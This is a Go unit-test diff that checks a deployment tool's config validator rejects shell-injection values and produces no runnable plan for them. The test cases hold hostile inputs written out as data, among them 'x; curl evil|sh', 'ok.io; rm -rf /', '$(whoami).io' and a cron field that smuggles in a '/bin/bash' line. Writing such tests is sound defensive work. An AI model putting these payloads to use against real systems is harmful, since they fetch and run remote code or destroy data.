@@ -399,3 +399,37 @@ func setOfTitles(steps []Step) map[string]bool {
 	}
 	return out
 }
+
+func TestValidateApplyConfigRejectsInjection(t *testing.T) {
+	cases := []ApplyConfig{
+		{ProjectName: "x; curl evil|sh", Domain: "ok.io"},
+		{ProjectName: "../..", Domain: "ok.io"},
+		{ProjectName: "shop", Domain: "ok.io; rm -rf /"},
+		{ProjectName: "shop", Domain: "$(whoami).io"},
+		{ProjectName: "shop", Domain: "ok.io", GitBranch: "main; touch /tmp/pwn"},
+		{ProjectName: "shop", Domain: "ok.io", GitURL: "https://a.b/x.git && echo hi"},
+		{ProjectName: "shop", Domain: "ok.io", GitPAT: "ghp_with;semicolon"},
+		{ProjectName: "shop", Domain: "ok.io", PHPVersion: "8.3 && echo hi"},
+		{ProjectName: "shop", Domain: "ok.io", AutoDeployCron: "* * * * * x\n/bin/bash -c pwn"},
+		{ProjectName: "shop", Domain: "ok.io", Database: Database{Engine: "mysql", Name: "db; drop all", Password: "longenough123"}},
+		{ProjectName: "shop", Domain: "ok.io", Database: Database{Engine: "mysql", Name: "shop", Password: "pwn'd-12345"}},
+	}
+	for i, cfg := range cases {
+		if err := ValidateApplyConfig(cfg); err == nil {
+			t.Errorf("case %d accepted: %+v", i, cfg)
+		}
+	}
+	good := ApplyConfig{
+		ProjectName: "shop", Domain: "shop.io", Environment: "production",
+		Kind: "laravel", GitBranch: "main", GitURL: "https://github.com/u/r.git",
+		PHPVersion: "8.3", Database: Database{Engine: "mysql", Name: "shop"},
+	}
+	if err := ValidateApplyConfig(good); err != nil {
+		t.Fatalf("valid config rejected: %v", err)
+	}
+	// Injection configs must never produce a runnable plan.
+	steps := BuildPlan(cases[0])
+	if len(steps) != 1 || steps[0].Title != "Validate configuration" {
+		t.Fatalf("injection produced a plan: %+v", steps[:1])
+	}
+}
